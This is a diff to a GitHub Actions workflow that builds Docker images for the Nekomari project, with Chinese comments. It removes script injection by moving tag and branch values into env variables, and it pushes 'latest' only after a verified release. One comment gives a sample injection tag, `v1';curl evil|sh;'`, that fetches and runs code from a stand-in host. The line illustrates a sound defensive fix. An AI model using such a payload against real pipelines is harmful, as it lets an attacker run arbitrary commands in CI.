@@ -85,14 +85,34 @@ jobs:
     steps:
       - name: Resolve tag
         id: tag
+        # 这一节需要的事件数据全部经 env 传入，脚本里只用 "$VAR" 引用。
+        #
+        # 为什么不直接插值：`${{ ... }}` 在 `run:` 里是【文本替换】，发生在 shell 解析之前
+        # —— 而这里喂进去的是 git ref 名（workflow_run.head_branch / release tag /
+        # dispatch 输入），ref 名允许 `;`、`$`、反引号、括号。一个叫
+        # `v1';curl evil|sh;'` 的 tag 就能在上一版脚本里执行任意命令。经 env 传递之后
+        # 这些字符只是变量的内容，shell 不会再看它们一眼。
+        # 被污染的是 INPUT_TAG 与 HEAD_BRANCH；其余是常量，一并走 env 以保持这一节
+        # 「脚本正文里没有任何 ${{ }}」这条可静态检查的性质。
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          INPUT_TAG: ${{ github.event.inputs.tag }}
+          RELEASE_TAG: ${{ github.event.release.tag_name }}
+          HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
+          # workflow_run 带来的那次 release 运行的结论；非 workflow_run 事件渲染成空串。
+          TRIGGER_CONCLUSION: ${{ github.event.workflow_run.conclusion }}
+          REGISTRY: ${{ env.REGISTRY }}
+          IMAGE_NAME: ${{ env.IMAGE_NAME }}
+          IMAGE_SUFFIX: ${{ matrix.image_suffix }}
+          MATRIX_NAME: ${{ matrix.name }}
         run: |
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            TAG="${{ github.event.inputs.tag }}"
-          elif [ "${{ github.event_name }}" = "release" ]; then
-            TAG="${{ github.event.release.tag_name }}"
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            TAG="$INPUT_TAG"
+          elif [ "$EVENT_NAME" = "release" ]; then
+            TAG="$RELEASE_TAG"
           else
             # workflow_run：tag 推送触发的 run 会把 tag 放在 head_branch 上。
-            TAG="${{ github.event.workflow_run.head_branch }}"
+            TAG="$HEAD_BRANCH"
           fi
           case "$TAG" in
             v*) ;;
@@ -101,19 +121,41 @@ jobs:
           echo "tag=$TAG" >> "$GITHUB_OUTPUT"
           # GHCR 的仓库名必须小写，而 github.repository 是 Aone2233/Nekomari。
           # 自己转一次，不依赖 metadata-action 的行为。
-          IMAGE=$(echo "${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}${{ matrix.image_suffix }}" | tr '[:upper:]' '[:lower:]')
+          IMAGE=$(echo "$REGISTRY/$IMAGE_NAME$IMAGE_SUFFIX" | tr '[:upper:]' '[:lower:]')
           echo "image=$IMAGE" >> "$GITHUB_OUTPUT"
-          echo "Building ${{ matrix.name }} image for $TAG as $IMAGE"
+          echo "Building $MATRIX_NAME image for $TAG as $IMAGE"
+
+          # latest 的含义是「这个版本通过了完整的发布验证」，不是「这个版本号存在」。
+          #
+          # 触发本工作流的 release 运行末尾有一个 verify 作业：它把刚发布的产物当成
+          # 用户拿到的东西真的部署一遍（见 release.yml 末尾）。它失败时整个 release 运行
+          # 的结论是 failure —— 而 Release 此时【已经发布】，版本号 tag 必须照推（镜像
+          # 打包的就是那份已发布的产物），只有 latest 不能跟着走。
+          # 事故现场：v1.6.6 的 verify 13 passed / 2 failed，镜像仍被推成 latest，
+          # 于是新部署的人拿到的是没通过验证的版本。
+          #
+          # 只认 success：failure / timed_out / action_required / skipped / stale 都算未验证。
+          # cancelled 到不了这里 —— 上面的 job 级 if 会整跳（那是有意保留的既有行为，
+          # 见那里的注释）。release:published 与 workflow_dispatch 没有可读的运行结论，
+          # 维持改动前的行为。
+          if [ "$EVENT_NAME" != "workflow_run" ] || [ "$TRIGGER_CONCLUSION" = "success" ]; then
+            echo "release_verified=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "release_verified=false" >> "$GITHUB_OUTPUT"
+          fi
 
       # 镜像的前提是 Release 存在，而不是「release 工作流整体成功」——后者包含
       # verify，它失败不该阻止打包已经发布出去的产物。
       - name: Check the Release exists
         env:
           GH_TOKEN: ${{ github.token }}
+          # tag 经 env 传入：它源自 git ref 名，插进脚本文本就是命令注入。
+          TAG: ${{ steps.tag.outputs.tag }}
+          REPO: ${{ github.repository }}
         run: |
           set -euo pipefail
-          tag='${{ steps.tag.outputs.tag }}'
-          if ! gh release view "$tag" --repo "${{ github.repository }}" >/dev/null 2>&1; then
+          tag="$TAG"
+          if ! gh release view "$tag" --repo "$REPO" >/dev/null 2>&1; then
             echo "::error::release $tag does not exist, so there is nothing to package. If the release workflow failed before creating it, fix that first."
             exit 1
           fi
@@ -130,6 +172,8 @@ jobs:
       - name: Assemble the build context
         env:
           GH_TOKEN: ${{ github.token }}
+          TAG: ${{ steps.tag.outputs.tag }}
+          REPO: ${{ github.repository }}
         run: |
           set -euo pipefail
           mkdir -p ctx
@@ -139,15 +183,15 @@ jobs:
           # "No such file or directory"。
           for f in Dockerfile Dockerfile.agent; do
             if [ ! -f "$f" ]; then
-              echo "::error::$f is not in ${{ steps.tag.outputs.tag }}: that tag predates it, so it cannot build these images. Cut a release that contains it."
+              echo "::error::$f is not in $TAG: that tag predates it, so it cannot build these images. Cut a release that contains it."
               exit 1
             fi
           done
           cp Dockerfile Dockerfile.agent ctx/
           # 服务端产物：nekomari-*；探针产物只取 linux（镜像跑在 linux 上，
           # darwin/windows 的探针不可能是容器）。
-          gh release download "${{ steps.tag.outputs.tag }}" \
-            --repo "${{ github.repository }}" \
+          gh release download "$TAG" \
+            --repo "$REPO" \
             --pattern 'nekomari-*' \
             --pattern 'komari-agent-linux-*' \
             --dir ctx
@@ -171,9 +215,13 @@ jobs:
         uses: docker/metadata-action@v6
         with:
           images: ${{ steps.tag.outputs.image }}
+          # latest 的开关见上面 Resolve tag 里的 release_verified：版本号 tag 始终推，
+          # latest 只在触发它的 release 运行真的成功（或没有结论可读）时才推。
+          # 注意这里不能改成裸的 release_verified —— GitHub 把任何非空字符串都当 true，
+          # 而 "false" 正是非空字符串。
           tags: |
             type=raw,value=${{ steps.tag.outputs.tag }}
-            type=raw,value=latest,enable=${{ !contains(steps.tag.outputs.tag, '-') }}
+            type=raw,value=latest,enable=${{ !contains(steps.tag.outputs.tag, '-') && steps.tag.outputs.release_verified == 'true' }}
             type=semver,pattern={{version}},value=${{ steps.tag.outputs.tag }}
             type=semver,pattern={{major}}.{{minor}},value=${{ steps.tag.outputs.tag }}
 
@@ -222,9 +270,14 @@ jobs:
       # 无凭证请求同样返回 401，必须先换匿名 token。用 401 当私有信号会把公开
       # 镜像误判成私有（我一开始就是这么误判的）。
       - name: Verify the image is anonymously pullable
+        env:
+          # 同样是那个来自 git ref 名的 tag：经 env 传递，不插值进脚本。
+          TAG: ${{ steps.tag.outputs.tag }}
+          OWNER: ${{ github.repository_owner }}
+          PACKAGE: ${{ matrix.package }}
         run: |
           set -euo pipefail
-          REPO_LOWER=$(echo "${{ github.repository_owner }}/${{ matrix.package }}" | tr '[:upper:]' '[:lower:]')
+          REPO_LOWER=$(echo "$OWNER/$PACKAGE" | tr '[:upper:]' '[:lower:]')
           LAST_REASON="anonymous token unavailable"
           # 新推送的 manifest 可能尚未在匿名端点可见；每个矩阵镜像独立重试。
           for ATTEMPT in 1 2 3 4 5 6 7 8; do
@@ -236,9 +289,9 @@ jobs:
                   -o /dev/null -w '%{http_code}' \
                   -H "Authorization: Bearer $TOKEN" \
                   -H 'Accept: application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.list.v2+json' \
-                  "https://ghcr.io/v2/${REPO_LOWER}/manifests/${{ steps.tag.outputs.tag }}"); then
+                  "https://ghcr.io/v2/${REPO_LOWER}/manifests/$TAG"); then
                   if [ "$CODE" = "200" ]; then
-                    echo "anonymous manifest fetch for ${REPO_LOWER}:${{ steps.tag.outputs.tag }}: HTTP 200"
+                    echo "anonymous manifest fetch for ${REPO_LOWER}:$TAG: HTTP 200"
                     exit 0
                   fi
                   LAST_REASON="manifest returned HTTP $CODE"
@@ -258,6 +311,6 @@ jobs:
               sleep "$DELAY"
             fi
           done
-          echo "::error::${REPO_LOWER}:${{ steps.tag.outputs.tag }} is not anonymously pullable after 8 attempts: ${LAST_REASON}"
+          echo "::error::${REPO_LOWER}:$TAG is not anonymously pullable after 8 attempts: ${LAST_REASON}"
           echo "::error::If HTTP 401/403 persists, make the GHCR package public under Package settings -> Change visibility; otherwise check registry publication and network access."
           exit 1
